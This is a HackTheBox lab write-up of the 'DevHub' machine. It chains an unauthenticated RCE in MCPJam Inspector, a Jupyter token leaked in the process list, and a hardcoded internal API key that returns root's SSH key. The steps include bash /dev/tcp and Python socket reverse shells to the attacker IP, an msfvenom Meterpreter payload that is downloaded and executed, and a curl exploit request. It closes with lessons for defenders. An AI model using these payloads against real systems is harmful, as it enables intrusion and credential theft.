# [DevHub](https://app.hackthebox.com/machines/DevHub) - HackTheBox Machines Writeup

```
Box       : DevHub
OS        : Linux (Ubuntu 22.04)
Difficulty: Medium
Target    : 10.129.121.120
Attacker  : 10.10.15.82
```

---

## Attack Path Overview

```
Unauthenticated RCE in MCPJam Inspector (CVE-2026-23744)
        v
Shell as mcp-dev   >   Local Jupyter Token Found in Process List
        v
Port-Forward to Jupyter   >   Shell as analyst
        v
Internal "opsmcp" API (hardcoded key)   >   root's SSH Private Key
```

---

## 1. Reconnaissance

```bash
$ nmap -p- -T4 10.129.121.120

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6274/tcp open  unknown
```

Here we can see:

- **SSH (22)**: the standard remote administration port on Linux. Any credentials found elsewhere are worth testing here: password reuse is extremely common.
- **HTTP (80)**: a web application. The primary attack surface to investigate first.
- **Unknown (6274)**: nmap couldn't fingerprint the service from its default probes. Worth a manual check before anything else.

## 2. Web Enumeration

```bash
$ curl -s http://10.129.121.120

<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

Now check the unrecognized port with an HTTP call.

```bash
$ curl -s http://10.129.121.120:6274

...
<title>MCPJam Inspector</title>
...
```

Port `6274` turned out to be a web-based control dashboard for **MCPJam Inspector**, a local development tool for MCP servers.

## 3. Unauthenticated RCE - CVE-2026-23744

A quick search for the product and version (`1.4.2`, visible at `/#settings`) turned up a recent, unauthenticated RCE:
[CVE-2026-23744](https://packetinside.github.io/cves/cve-2026-23744/) /
[GHSA-232v-j27c-5pp6](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6).

**Root cause:** the `/api/mcp/connect` endpoint lets a client ask the Inspector to install and launch an arbitrary MCP server. It does the "install" by just executing whatever `command`/`args` the client supplies, with no authentication. Because the Inspector binds to `0.0.0.0` by default instead of `127.0.0.1`, this is exploitable over the network with a single HTTP request.

First, confirm this with a callback test:

```bash
$ curl -s -X POST http://10.129.121.120:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"timeout":10000,"command":"curl",
       "args":["http://10.10.15.82:8080/Hi-There"],"env":{}},
       "serverId":"mymcp"}'
```

```
# nc -lvnp 8080
connect to [10.10.15.82] from (UNKNOWN) [10.129.121.120] 44354
GET /Hi-There HTTP/1.1
User-Agent: curl/7.81.0
```

With the callback successful, we can give ourselves shell access:

```bash
$ curl -s -X POST http://10.129.121.120:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"timeout":10000,"command":"bash",
       "args":["-c","bash -i >& /dev/tcp/10.10.15.82/8080 0>&1"],
       "env":{}},"serverId":"mymcp"}'
```

```
# nc -lvnp 8080
connect to [10.10.15.82] from (UNKNOWN) [10.129.121.120] 56338
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ whoami
mcp-dev
```

A raw `bash -c` command line proves the point, but it's a poor interactive shell. For everything afterward, that shell was upgraded to Meterpreter:

```bash
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.82 LPORT=4445 -f elf -o shell.elf
$ python3 -m http.server 8000      # serve the payload
$ msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 10.10.15.82; set LPORT 4445; exploit"
```

```bash
# on target, via the netcat shell:
$ curl http://10.10.15.82:8000/shell.elf -o /tmp/shell.elf
$ chmod +x /tmp/shell.elf
$ /tmp/shell.elf
```

```
meterpreter > sysinfo
Computer     : devhub
OS           : Ubuntu 22.04 (Linux 5.15.0-179-generic)
```

## 4. Lateral Movement - mcp-dev to analyst

Standard LinPEAS enumeration (`upload linpeas.sh` / `sh linpeas.sh`) turned up nothing actionable. Instead, a manual look at the running process list was what paid off.

Besides the user `mcp-dev`, whose home directory had nothing interesting, I found a user `analyst` with a home directory at `/home/analyst` worth investigating.

```
meterpreter > shell
$ ps aux | grep analyst

analyst  1050  ...  jupyter-lab --ip=127.0.0.1 --port=8888 \
    --notebook-dir=/home/analyst/notebooks \
    --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ...
root     1083  ...  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

A Jupyter Lab instance owned by `analyst` is running with its access token printed right there in the command line. Because it's bound to `127.0.0.1`, it's reachable only on the box itself. I set up a port forward through the existing Meterpreter session to work in a more stable environment:

```
meterpreter > portfwd add -l 8888 -p 8888 -r 127.0.0.1
```

Now, on my local browser, I can visit `http://localhost:8888/?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`

With the notebook UI reachable locally, a Python cell gives a full interactive shell running as `analyst`:

```python
import socket, subprocess, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.15.82", 4448))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
```

```
# nc -lvnp 4448
analyst@devhub:~/notebooks$ cat ~/user.txt
893fbd09...
```

## 5. Privilege Escalation - The `opsmcp` Internal API

### 5.1 Discovering the Service

That same `ps aux` output flagged a second process worth returning to:

```
root  1083  0.0  0.7  37376  28892  ?  Ss  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

A Flask service running **as root**, reachable only from localhost. To upgrade the `analyst` foothold for easier interaction, the same msfvenom/handler pattern used earlier was repeated against port `4448`, then `server.py` was read directly from disk:

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401
    ...
    if tool_name == "ops._admin_dump":
        target = args.get('target', '')
        if not args.get('confirm', False):
            return jsonify({"error": "Confirmation required", "warning": "This dumps sensitive credentials"})
        if target == "ssh_keys":
            with open('/root/.ssh/id_rsa', 'r') as f:
                return jsonify({"root_private_key": f.read()})
        elif target == "passwords":
            return jsonify({"dump": { "root": "...", "analyst": "...", "mcp-dev": "..." }})
        elif target == "tokens":
            return jsonify({"api_tokens": { "admin_token": "...", "service_token": "..." }})
```

### 5.2 Exploiting `ops._admin_dump`

An internal "ops" automation API, running as root, hard-codes its own API key in source and exposes an `_admin_dump` tool that will hand back `/root/.ssh/id_rsa` on request, gated only by that static key plus a `confirm: true` flag. `id_rsa` is the private key of an SSH keypair: having it would let us log in as root over SSH without any further authentication.

We still have the `analyst` Python cell, which we can use to call the API:

```python
import requests
url = "http://127.0.0.1:5000/tools/call"
headers = {"X-API-Key": "opsmcp_secret_key_4f5a6b7c8d9e0f1a", "Content-Type": "application/json"}
payload = {"name": "ops._admin_dump", "arguments": {"confirm": True, "target": "ssh_keys"}}
requests.post(url, headers=headers, json=payload)
```

### 5.3 Root Access

Run from inside the Jupyter notebook (already proxied to localhost), this returns root's private SSH key in full, which I saved into `/tmp/devhub.key`.

```bash
$ chmod 600 /tmp/devhub.key
$ ssh -i /tmp/devhub.key root@10.129.121.120

root@devhub:~# cat root.txt
71421653...
```

## Lessons Learned

**For defenders:**

- **Don't bind development tools to `0.0.0.0`.** MCPJam Inspector's choice of default bind address is what turned a locally-exploitable bug into a remotely-exploitable one.
- **Service tokens and auth tokens do not belong on a command line.** `ps aux` is readable by any other local user.
- **A hardcoded API key is not a secret once the source is readable.** `opsmcp/server.py`'s key was committed in cleartext and could be read by users other than root.
- **"Admin dump" endpoints that return private keys over HTTP** are a single point of total compromise.

**What I learned**

- **`ps aux`** can give easy access to tokens and secrets.

**Tools I used**

- nmap
- ps
- CVE databases
- metasploit
